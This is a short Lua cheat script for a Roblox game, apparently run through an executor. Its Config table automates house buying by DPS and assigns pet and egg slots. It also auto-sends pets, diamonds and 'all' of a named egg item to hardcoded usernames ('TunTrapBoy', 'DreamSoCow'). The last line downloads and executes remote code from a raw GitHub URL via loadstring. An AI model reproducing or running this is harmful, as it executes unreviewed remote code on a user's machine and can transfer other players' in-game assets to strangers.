getgenv().Config = {
    DPS_THRESHOLDS = {
        HOUSE1 = { '>0' }, -- mua theo dps , buy by dps
        HOUSE2 = { '>1000' }, 
        HOUSE3 = { '6000~14000', '>25000' }, 
        HOUSE4 = { '14000~20000' }, 
        HOUSE5 = { '>24000' }, 
        HOUSE6 = { '>30000' },
    },
    plant = {
        PET_SLOTS = { 1, 2, 3, 4, 5, 6, 7, 8, 9 }, -- slot dành cho pet
        EGG_SLOTS = { 10 }, -- slot dành cho trứng
    },
    -- Gửi PET Titanic/Huge
    SEND_PET = {
        Usernames = { 'TunTrapBoy' },
        PetSendInterval = 60,
    },
    -- Gửi DIAMONDS
    SEND_DIAMONDS = {
        Usernames = { 'DreamSoCow' },
        MinDiamonds = 50000000,
    },
    -- Gửi ITEM
    SEND_ITEM = {
        Usernames = { 'TunTrapBoy' },
        ['Exclusive Brainrot Egg'] = { amount = 'all' },
    },
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/dsadgeee/21521521/refs/heads/main/track.lua"))()
